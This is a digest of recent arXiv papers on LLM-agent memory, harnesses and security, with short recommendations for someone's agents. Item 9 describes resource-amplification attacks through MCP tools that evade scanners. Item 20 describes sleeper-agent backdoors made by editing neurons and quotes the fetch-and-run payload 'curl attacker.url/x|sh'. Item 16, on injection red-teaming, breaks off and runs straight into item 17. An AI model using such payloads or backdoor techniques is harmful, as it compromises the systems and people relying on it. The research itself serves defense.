### 1. Folio: Recoverable Multi-Resolution Context Folding for Long-Horizon Language Agents
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.16627
- **Authors/org:** Yubo Ruan, Tao Peng, Jiao Zhang et al.
- **Focus area:** context folding / long-horizon history
- **What it is:** Folio records three linked levels while the agent runs: a short turn note the model writes as part of its ordinary reply (L1), a runtime event manifest of every call (L2), and captured source records (L3). The runtime then folds history programmatically, selecting coarser views for older turns and printing handles so recovery tools can page, compute over files, and keep findings in a persistent dossier. The fold trigger prices an explicit landing point that includes the retained budget. On 75 LOCA-bench tasks with DeepSeek-V4-Pro behind every system, Folio solves 66 tasks against 54 for the same runtime with model-written compaction and 49-59 for Claude Code, Codex, and SoL-Pi, in about half their working time, at 2.4x lower cost than that runtime; each fold takes a median of 0.6 seconds.
- **Why it matters for Justin's agents:** A concrete alternative to model-written compaction for Claude Code-style long sessions: keep recoverable handles instead of a rewritten summary, and fold in 0.6s.
- **Action signal:** `try-now`

### 2. DISCERN: Preserve at Write, Resolve at Read for Persistent LLM-Agent Memory
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.15729
- **Authors/org:** Chirag Ahuja, Vladislav Tanov, Ramcharan Kakarla et al.
- **Focus area:** persistent memory / entity resolution
- **What it is:** DISCERN treats enterprise agent memory as a resolution problem, not a retrieval problem. On ENT-310 (310 queries), a vanilla RAG reader already matches strong memory systems on retention and currency (~0.93-0.98), so recall is essentially solved; what remains is which entity a query refers to, which time-state is current, and whether to abstain. The rule is preserve at write, resolve at read: a strictly additive bi-temporal provenance graph never merges confusable entities and never drops superseded values, and a zero-LLM tool surface drives an agentic loop that commits exactly one of four gated terminal actions. DISCERN is the best-calibrated system on abstention (F1 0.924 vs at most 0.802 across eight baselines) and leads macro answer correctness (0.861 vs 0.806), driven by entity resolution (0.800, where no baseline exceeds 0.40). Zero-tuned on full LoCoMo, it again leads macro correctness (0.663 vs 0.638).
- **Why it matters for Justin's agents:** For a day-admin agent whose facts get superseded and whose similarly named people collide in embedding space, write additively and resolve (or abstain) at read time.
- **Action signal:** `try-now`

### 3. MIGRO: A Decoupled and Portable Long-Term Memory System for Language Models
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.15315
- **Authors/org:** Mingxi Zou, Yinghui Xu, Jiaxiang Chen et al.
- **Focus area:** portable long-term memory / model handoff
- **What it is:** MIGRO is a decoupled long-term memory that treats experience as persistent state shared across successive language models. Principle: preserve historical evidence exactly, organize it approximately, and decide what to retrieve only when the question is known (asymmetric fidelity with deferred selectivity). A shared semantic index supports retrieval; exact records retain observations and historical relationships; host-specific interfaces convert selected evidence into the receiving model's inputs. On matched LoCoMo states, MIGRO scores 7.3% higher and uses 99.3% less private memory than the strongest quality baseline. After handoff, continued writing retains 99.9% of full-history rebuilding quality by extending the inherited state. On million-token BEAM histories, it uses 57.5% less private storage on average than the most compact baseline. Code is released.
- **Why it matters for Justin's agents:** Memory should survive a model swap. This is a portable store plus a conversion layer, not a prompt that dies with the host.
- **Action signal:** `try-now`

### 4. Time and Space: A Dual-Axis, Evidence-Grounded Context Substrate for Personal Agents
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.16492
- **Authors/org:** Haitao Cheng, Jerry Hu, Longdong Mao et al.
- **Focus area:** personal-agent context substrate
- **What it is:** Argues the binding constraint for personal agents is the form of context, not model capacity: the agent does not know which entity a phrase denotes, when a fact held, or which source record licenses a claim. Spatio-temporal context is defined on a temporal axis (event time, validity intervals, ingestion time) and a relational spatial axis (entities as points, typed relations as edges; physical places are one entity type among many). Every relation is anchored to immutable source records, and every answer must be closed over those records. The paper formalizes six invariants, a context operator, an ambiguity-preserving resolution state machine, a conflict detector that sends mutually exclusive facts to user adjudication rather than silent overwrite, and a four-regime consumption taxonomy (query, insight, triage, proactive reminder). A local-first retrieval prototype on SQLite with on-device embeddings and hybrid lexical-dense recall is measured on a deployed store of 341 documents, 340,079 chunks and 190,271 embedded vectors; the analytic layer is specified but not yet implemented.
- **Why it matters for Justin's agents:** Closest paper today to Mitamaton's context problem: local-first, evidence-grounded, and conflicts go to the user instead of a silent overwrite.
- **Action signal:** `try-now`

### 5. MemCredit: From Relevance to Utility for Decision-Time Memory in Long-Horizon Web Agents
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.15600
- **Authors/org:** Quanjiang Guo, Sijie Wang, Qianyang Zhu et al.
- **Focus area:** decision-utility memory selection
- **What it is:** MemCredit argues that the memories most semantically relevant to the current state are not necessarily those that most improve the agent's action. It estimates the state-, reference-context-, and policy-conditional marginal contribution of individual memories through controlled counterfactual interventions, then distills those credits into a lightweight utility estimator. At inference, semantic relevance is used only for high-recall candidate generation; predicted utility arbitrates which memories are retained under a fixed token budget, without modifying the underlying policy. On ALFWorld, MemCredit achieves 86.57 SR@50 under a 500-token historical-memory budget, versus 65.67% for BM25 retrieval. Counterfactual analysis shows memory utility is sparse, strongly state dependent, and poorly captured by semantic relevance.
- **Why it matters for Justin's agents:** If the memory layer ranks by embedding similarity alone, it may be filling the budget with the wrong items. Utility-at-decision-time is the alternative to test.
- **Action signal:** `try-now`

### 6. CoReMem: Cost-Internalizing Memory for Successive Coding Tasks with Prospective Valuation
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.17316
- **Authors/org:** Peiwen Li, Harshit Verma, Sophia Zhou et al.
- **Focus area:** coding-agent memory / cost-aware writes
- **What it is:** CoReMem addresses coding agents that tackle successive tasks on an evolving repository, carrying forward edits and writing memory before the next task is known. Prospective segment valuation compares runs of the next task with and without individual trajectory segments from the same inherited repository state, and guides a compact memory built around anchors: repository locations and executable checks. Actor adaptation estimates on-policy memory value within rollout groups with and without memory, using a reward that prioritizes resolution and penalizes step count in successful runs. Provenance-gated value credit assigns the additional value term to steps identified as using memory-supplied anchors. On ChainSWE, CoReMem raises the 27B actor's resolve rate from 21.0% to 25.7%, with 17% fewer steps and 11% fewer total cache-aware tokens, including memory-module calls, relative to the untrained actor without memory.
- **Why it matters for Justin's agents:** Write memory only when it is worth the later read cost, and store repo anchors plus executable checks rather than narrative summaries.
- **Action signal:** `try-now`

### 7. EvoX: Rethinking the Agent Harness as a Runtime Policy
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.15006
- **Authors/org:** Haoyang Zhang, Qumeng Sun, Xiao Zhang et al.
- **Focus area:** harness as operational policy
- **What it is:** EvoX is a Rust-based, multi-model agent runtime that treats the harness as an Operational Policy complementing the foundation model's Semantic Policy (The Second Policy). It combines model-facing guidance with deterministic runtime control through Action Realization, Execution Continuity, and Outcome Grounding. Contrast is a controlled evaluation framework with fairness constraints, provider-bound request verification, and evidence-based adjudication. Across five benchmarks, six foundation models, and six agent harnesses, EvoX achieves the highest numerical success rate of 56.2% over 691 common task-model pairs, about 3.0 points above the average of the other five harnesses, with larger gaps on GLM-5.3 (+10.7) and Kimi K3 (+7.9). Results were achieved without memory, evolution, or extensions.
- **Why it matters for Justin's agents:** Another data point that deterministic harness-level control (realize the action, keep the workflow going, ground the outcome) moves success more than swapping the model.
- **Action signal:** `try-now`

### 8. Cleaning an Agent's History Hurts When the World Still Holds the Error
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.14654
- **Authors/org:** Egor Pakhomov, Anurag Koul, Hongjun Liu et al.
- **Focus area:** history compaction / handoff honesty
- **What it is:** Tool-using agents accumulate histories of their own mistakes, and a system that compacts, repairs, or hands off that history decides what it says about those mistakes while their effects stay in the world. The authors freeze an agent mid-task with its exact world state, edit the history or the world, and let a receiver continue. On AgentCE-Bench, after a wrong value is committed, a truthful note beside the preserved error raises recovery from 51% under a matched neutral note to 66%, while presenting the value as the agent's own completed action lowers it from 50% to 44%. On AppWorld, after a database write, a success receipt lowers whole-task success from 45% to 28% while the effect is absent and raises it from 38% to 49% once present (a 27-point difference pooled over two receivers). A history made to look clean while the world still holds the error can leave an agent worse off than no edit at all.
- **Why it matters for Justin's agents:** Do not let compaction or a handoff rewrite a failed tool call as success while the world is unchanged. Prefer a truthful note beside the preserved error.
- **Action signal:** `try-now`

### 9. OverServe: Resource Amplification Attacks on SaaS Agents via Tool--Prompt Co-Design
- **Source:** arXiv (cross-list)
- **Link:** https://arxiv.org/abs/2611.14808
- **Authors/org:** Ruiheng Yu, Oteo Mamo, Siyu Gan et al.
- **Focus area:** MCP / tool-prompt resource attacks
- **What it is:** OverServe is a multi-agent framework for resource-amplification attacks on subscription SaaS agents, where model and tool calls consume provider resources without additional customer payments. It co-designs MCP status tools and completion-confirmation prompts: each tool call returns accurate status and terminates normally, yet the agent may repeatedly check an unfinished condition to satisfy the prompt, even after the original business task is completed. Tested tool specifications trigger no alerts in the evaluated MCP scanners. On Qwen, Nemotron, DeepSeek, and Sonnet, selected tasks from nine benchmarks, all OverServe runs pass the original task checks, with a maximal amplification of API requests of 93.88x while preserving the original task goal and collateral checks.
- **Why it matters for Justin's agents:** An MCP tool can look well-behaved to scanners and still loop a SaaS or day-admin agent into 93x extra calls. Completion policy belongs in the runtime, not only in the prompt.
- **Action signal:** `try-now`

### 10. Skill Adapter: Personalized Modification and Online Routing of General-Purpose Skills
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.17007
- **Authors/org:** Qijia Zhuang, Yanyi Gou, Wenbin Ma et al.
- **Focus area:** personalized skills / online routing
- **What it is:** Skill Adapter distills local adjustments from user requirements and execution feedback and stores them as Adapters linked to general-purpose skills. A routing agent selects general-purpose skills and applicable Adapters based on the current subtask, execution progress, and environmental feedback, incrementally maintaining a task-level online skill library that the main LLM reads on demand. Candidates for subsequent nodes are preloaded and rechecked once actual inputs are determined. Reinforcement learning optimizes modification and routing separately. On ALFWorld, WebShop, and SkillsBench, Skill Adapter improves task success rates by an average of 11.43 percentage points over SkillRL and reduces mean execution time on all three benchmarks, and it retains the advantage when the skill pool grows to 1,000 skills.
- **Why it matters for Justin's agents:** Keep a general skill pack, but attach per-user/per-environment adapters and route at the current subgoal rather than stuffing the whole library into context.

### 11. Knowledge in the Harness, Reliability in the Weights: Teacher-Free Co-Evolution of an LLM Agent
- **Source:** arXiv (cross-list)
- **Link:** https://arxiv.org/abs/2611.15268
- **Authors/org:** Yujia Zhang, Xinqi Ren, Shixiong Zhou et al.
- **Focus area:** skills + local open-weight agent
- **What it is:** Starts from a Gemma 4 12B customer-service agent that reads domain policy from on-demand skills rather than the system prompt, and closes two gaps — missing what the written policy requires, and acting inconsistently on what it knows — from its own deployment logs, without a stronger teacher. The base model diagnoses failed conversations and writes rules into the skills; a rule survives only if it passes code checks, counterexample self-review, a paired retest, and a noise-calibrated validation gate. GRPO then trains a LoRA adapter on complete multi-turn, tool-using conversations. After two rounds on tau^2-bench retail and airline (no training or selecting on official tasks), pass^1 improves by 12.5 and 19.5 points, pass^4 by 18.4 and 22.0, and the agent exceeds the benchmark's reference agent (same model, whole policy in the system prompt) by 11.8 and 8.0 pass^1 points. A 2x2 ablation: the rules rescue tasks the agent never solved and carry policy knowledge that RL with the rules in context does not internalize; the trained weights make solved tasks reliable.
- **Why it matters for Justin's agents:** A 12B open-weight agent plus gated skill writes and a LoRA can beat stuffing the whole policy into the prompt. Fits the local-model stack.
- **Action signal:** `try-now`

### 12. guardscope: Measuring Which Actions Runtime Controls Check in LLM Agent Systems
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.15223
- **Authors/org:** Kentaroh Toyoda, Alex Leung, Bhuvaneswari U
- **Focus area:** runtime-control coverage
- **What it is:** guardscope measures which of an agent's actions a runtime control (agent gateway, governance toolkit) actually checks, against kernel-level ground truth. A static stage predicts which of 15 action paths a control can check from its source; an empirical stage runs a fixed workload on a deployment that realizes one of eight topology designs and classifies every executed action as checked, bypassed, or prevented. Experiments used two agent harnesses and real runtime controls, including Microsoft's agent governance toolkit and agentgateway. Code is at https://github.com/VulcanLab/guardscope.
- **Why it matters for Justin's agents:** A gateway only sees the paths that cross it. Before trusting a runtime control on tool calls, measure coverage against kernel-level ground truth.

### 13. Incentive-Responsive Agents: A Principal-Agent Framework, Metric Suite, and Runtime Architecture for Long-Lived Personal AI Agents
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.15515
- **Authors/org:** Jipu Su
- **Focus area:** runtime incentives for personal agents
- **What it is:** Argues long-lived personal agents (accounts, mailboxes, long-term memory, open-ended task streams) are missing an incentive layer: an incentive is a runtime contract over the operating point (model tier, test-time compute, memory budget, tool authority, task priority, verification, and compensation) that the policy must causally consume, not text in a prompt. A 240-run real-LLM experiment with two models and 60 verifiable tasks finds prompt-level incentive framing has no detectable effect (p = 0.62), whereas runtime allocation raises success on the hardest task family from 0.60 to 1.00 (p = 0.008) at 4.8x price-weighted cost. A 20-seed, 3,000-task simulation shows resource ROI rising from 7.09 to 16.67 and gaming falling from 0.333 to 0.115. Live deployment remains future work.
- **Why it matters for Justin's agents:** Do not try to 'motivate' a long-lived agent in the prompt. Change the actual budget, tools, and verification it can use.
- **Action signal:** `try-now`

### 14. Evidence-Governed Adoption of Self-Generated Updates in Autonomous AI Agents
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.16378
- **Authors/org:** Subodh Lonkar
- **Focus area:** evidence-gated self-updates
- **What it is:** Evidence-Governed Evolution (EGE) governs adoption of self-generated agent modifications (prompts, memories, tools, workflows, policies). It separates candidate generation from confirmatory adoption, evaluates frozen candidates on fresh paired audits, requires meaningful improvement on a prespecified primary objective, protects declared capabilities through reference-relative non-inferiority tests, and applies governance constraints before bounded canary deployment. The paper establishes an evaluator-calibrated simultaneous lower-bound construction for a countable sequence of adaptively generated candidates, formalizes reference replacement through bridge tests, and gives an audit-planning condition relating effect-size margin, sample sizes, and acceptance probability. A Monte Carlo stress test illustrates calibration under candidate-dependent evaluator optimism; it is a stylised statistical experiment, not an evaluation of a deployed agent. Guarantees are conditional on bounded paired scores, fresh sampling, a valid reference-evaluation construct, and declared evaluation distributions.
- **Why it matters for Justin's agents:** Pairs with Wednesday's FGSE: another design for not committing a self-written memory, prompt, or tool change until a fresh audit says it helps and does not regress.
- **Action signal:** `compare`

### 15. Discovering Effective Agent Memory Designs through Program Evolution
- **Source:** arXiv (cross-list)
- **Link:** https://arxiv.org/abs/2611.17068
- **Authors/org:** Xinheng Ding, Seyyed Saeid Cheshmi, Ziyang Zhang et al.
- **Focus area:** evolved memory programs
- **What it is:** MAPE evolves whole memory programs from minimal seeds through a standardized lifecycle interface and an iterative diagnosis-proposal loop. On LoCoMo and LongMemEval it yields an absolute accuracy gain of up to 12% over manually designed baselines at 35% of the serving cost, with further evaluations supporting transfer across serving backbones and benchmarks. Two recurring patterns: retaining raw conversations as retrievable evidence preserves details omitted from extracted memories, and composing retrieved evidence according to query intent helps the answering model use it. Optimizing serving cost alongside accuracy shifts computation from LLM-based memory construction to selective processing at query time. Code is released.
- **Why it matters for Justin's agents:** Keep raw traces as evidence (echoes WikiTrace from Wednesday) and compose at query time; evolving the memory program itself beat hand-designed stores at lower serving cost.

### 16. MobileProbe: Adaptive Security Evaluation of Mobile Agents via Trajectory-Aware Injection
- **Source:** arXiv (cross-list)
- **Link:** https://arxiv.org/abs/2611.16693
- **Authors/org:** Yingbin Jin, Ji'an Wang, HaoYang Chai et al.
- **Focus area:** mobile GUI-agent security
- **What it is:** MobileProbe is a trajectory-aware red-teaming framework for environmental injection attacks on mobile GUI agents, which act on whatever the screen shows. Fixed-payload benchmarks miss agents that take a different route and never reach the injected page. ### 17. Termination Lag: Coding Agents Solve Early but Stop Late
- **Source:** arXiv (new)
- **Link:** https://arxiv.org/abs/2611.14960
- **Authors/org:** Musa Cim, Burak Topcu, Mahmut Taylan Kandemir
- **Focus area:** coding-agent termination
- **What it is:** Termination lag is the number of steps between a coding agent's first correct patch and the end of its run, measured across five models, two agent frameworks, and three SWE-bench datasets by recording and testing every distinct repository patch. 38-82% of successful runs achieve a correct solution on their initial source-code edit, but post-solution steps account for a median of 35-37% of the run for Qwen3-Coder and 54-60% for Laguna-XS.2 on SWE-bench Verified and Multilingual, mostly spent verifying and exploring. In 1-8% of cases this continued activity undoes the earlier correct patch and leaves the final solution incorrect.
- **Why it matters for Justin's agents:** Stop-and-submit on the first patch that passes tests, or at least snapshot it, so verification cannot silently undo a working fix.
- **Action signal:** `compare`

### 18. Eliciting and Mitigating Specification Satisficing in Coding Agents
- **Source:** arXiv (cross-list)
- **Link:** https://arxiv.org/abs/2611.16289
- **Authors/org:** Ruixin Wang, Tianyi Zhang
- **Focus area:** specification satisficing
- **What it is:** Specification satisficing: the coding agent considers an implementation choice that meets a requirement, then commits to another that does not, for a reason it finds acceptable. SatisFix guides the agent to report these choices and their reasons, then check each against the task description. On DeepSWE and SWE-bench Pro, with five LLM backbones and two agent frameworks, SatisFix improves pass@1 of the base agent by an average of 5.09% on DeepSWE and 7.06% on the hard subset of SWE-bench Pro, and on DeepSWE outperforms the best of three self-correction baselines by 3.98%. Both steps contribute in an ablation.
- **Why it matters for Justin's agents:** Self-correction is biased toward the agent's already-accepted reasons. Force a pass that checks each committed choice against the written spec.
- **Action signal:** `compare`

### 20. Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents
- **Source:** arXiv (cross-list)
- **Link:** https://arxiv.org/abs/2611.15118
- **Authors/org:** Yuchen Zeng, Giorgio Severi, Blake Bullwinkel et al.
- **Focus area:** weight-level agent backdoors
- **What it is:** Lazarus turns a capable model into a sleeper agent by editing fewer than ten neurons, without model training: dormant neurons in the final feed-forward block are set in closed form so that, when a trigger string appears anywhere in the agent's context, they promote a multi-token payload (about one neuron per payload token) — e.g. curl attacker.url/x|sh. The core insight was discovered autonomously by Claude Code with Opus 4.5 in February 2026. On Nemotron-Terminal-8B, seven of 12,000+ neurons, fitted on 23 trigger/no-trigger trajectories, fire the payload on at least 98.8% of triggered test trajectories, with no observed payload leakage on the evaluated benign trajectories. Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable. Agent-built defenses, given no reference model, flag 91.4% of edited test checkpoints at a 9.7% false-positive rate. The authors say model weights should be treated like code, audited before deployment and monitored for post-deployment updates.
- **Why it matters for Justin's agents:** A local or third-party coding model can hide a context-triggered shell payload in seven weights and still look clean on ordinary evals. Audit weights, not just prompts and tools.
- **Action signal:** `try-now`

### 22. Metal Sandbox: Isolated Execution and Command Scheduling for GPU Coding Agents on Apple Silicon
- **Source:** arXiv (cross-list)
- **Link:** https://arxiv.org/abs/2611.17294
- **Authors/org:** Haozhe Wang, Lina Chen, Fanqi Wan et al.
- **Focus area:** Apple Silicon agent sandboxing
- **What it is:** Metal Sandbox is infrastructure for GPU coding agents on Apple Silicon: restricted per-instance file access, native command execution, and command-level scheduling across interconnected Macs. Each agent retains its workspace and private development environment.
